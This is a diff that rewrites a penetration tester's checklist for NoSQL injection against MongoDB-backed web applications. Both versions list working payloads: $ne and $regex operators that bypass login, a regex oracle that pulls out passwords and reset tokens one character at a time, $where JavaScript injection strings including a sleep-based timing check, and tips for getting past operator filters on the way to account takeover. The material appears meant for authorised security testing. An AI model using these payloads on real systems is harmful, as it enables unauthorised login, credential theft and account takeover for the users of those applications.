@@ -1,29 +1,30 @@
-# NoSQL Injection
+# NoSQL injection
 
 ## Before I start
-- [ ] App smells like Mongo (Node/Express, JSON API, /api/ routes): :Pb api
+- [ ] The application looks like MongoDB behind it: Node and Express, a JSON API, /api/ routes: :Pb api
 
-## Auth bypass
-username=admin&password[$ne]=x
-username=admin&password[$regex]=.*
-{"username":"admin","password":{"$ne":null}}
-- [ ] Form-encoded filtered? Resend as application/json — most apps parse both, filter one
-- [ ] Also try $gt with empty value and $where JS: ' || 1==1//
+## Login bypass
+In a form body, then as JSON:
+username=<Username>&password[$ne]=x
+username=<Username>&password[$regex]=.*
+{"username":"<Username>","password":{"$ne":null}}
+- [ ] Operators filtered in a form body: sent again as application/json, since most applications parse both and filter one
+- [ ] $gt with an empty value as well
 
-## Boolean oracle extraction
-username=admin&password[$regex]=^a
-- [ ] Login success/fail differs = oracle; loop chars with a python script (requests + json body)
-- [ ] Extract: passwords, reset tokens, other users' fields
+## Extract a value, one character at a time
+username=<Username>&password[$regex]=^a
+- [ ] A login that succeeds or fails by the pattern is an oracle: a short Python script with requests tries each next character
+- [ ] Passwords, reset tokens and other users' fields come out this way
 
-## $where JS context
+## $where, a JavaScript context
 ' || 1==1//
 ' && this.password.match(/^a/)//
-- [ ] Rare on modern stacks — operators first, JS second
+- [ ] Rare on a modern stack: operators first, JavaScript second
 
 ## If it fails
-- [ ] 400 on operators = query builder sanitizes → try nested JSON, array pollution
-- [ ] No boolean difference → time-based inside $where (' && sleep(5000)// — if eval exists)
+- [ ] 400 on operators: the query builder cleans them, so nested JSON and repeated parameters
+- [ ] No difference to see: a delay inside $where, ' && sleep(5000)//, where it evaluates JavaScript
 
 ## Next
-- [ ] Token/password extraction → account takeover → keep mapping: :Pb api
-- [ ] Mongo reachable on the host directly: :Pb mongodb
+- [ ] A token or password: the account, then :Pb api
+- [ ] MongoDB reachable on the host itself: :Pb mongodb
